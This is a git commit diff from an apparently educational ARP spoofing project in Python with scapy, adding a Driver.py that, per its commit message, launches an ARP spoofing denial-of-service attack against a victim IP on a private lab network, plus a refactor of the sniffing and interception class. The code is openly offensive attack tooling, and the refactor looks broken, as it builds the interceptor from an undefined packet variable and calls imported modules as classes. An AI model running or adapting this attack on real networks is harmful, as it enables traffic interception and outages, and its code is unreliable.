0f5f4b95fcd017fd0f24a3b670688e38baed321a
SerbanJinga <33983121+SerbanJinga@users.noreply.github.com>
2023-06-04 12:55:40 +0200

    Running Driver.py now runs an ARP spoofing DOS attack

--- ARPStart.py
+++ ARPStart.py
@@ -1,9 +1,9 @@
 from scapy.all import * 
-from Functions import *
-from Interceptor import * 
-from ARPPoisoning import *
+import Functions
+import Interceptor
+# from ARPPoisoning import *
+import ARPPoisoning
 
-interceptor = Interceptor()
 functions = Functions()
 arpPoisoning = ARPPoisoning()
 
@@ -22,12 +22,14 @@ class ARPStart():
         self.macAttacker = get_if_hwaddr(self.networkId)
         self.macVictim = functions.retrieveMACAdress(networkID=self.networkId, ipConfig=ipVictim)
         self.macServer = [functions.retrieveMACAdress(networkID=self.networkId, ipConfig=ip) for ip in ipSpoof]
+        self.interceptor = Interceptor(packet, self.macAttacker, self.ipSpoof, self.macServer, self.macVictim, self.networkId, self.silentMode)
+
 
     def startSniffing(self):
         sniff(prn=self.startIntercepting, iface=self.networkId, filter="ip", timeout=20)
 
     def startIntercepting(self, packet):
-        interceptor.interceltARP(packet, self.macAttacker, self.ipSpoof, self.macServer, self.macVictim, self.networkId, self.silentMode)
+        self.interceptor.interceltARP()
 
     def spoofing(self):
         arpPoisoning.arpPoisoning(self.ipVictim, self.ipSpoof, self.networkId)
---
+++ Driver.py
@@ -0,0 +1,9 @@
+from scapy.all import * 
+from ARPStart import * 
+
+networkID = "ens0s3"
+ipVictim = "192.168.56.101"
+ipSpoof = "192.168.56.102"
+silentMode = False
+arpStart = ARPStart(networkID=networkID, ipVictim=ipVictim, ipSpoof=ipSpoof, silentMode=silentMode)
+arpStart.startARP()
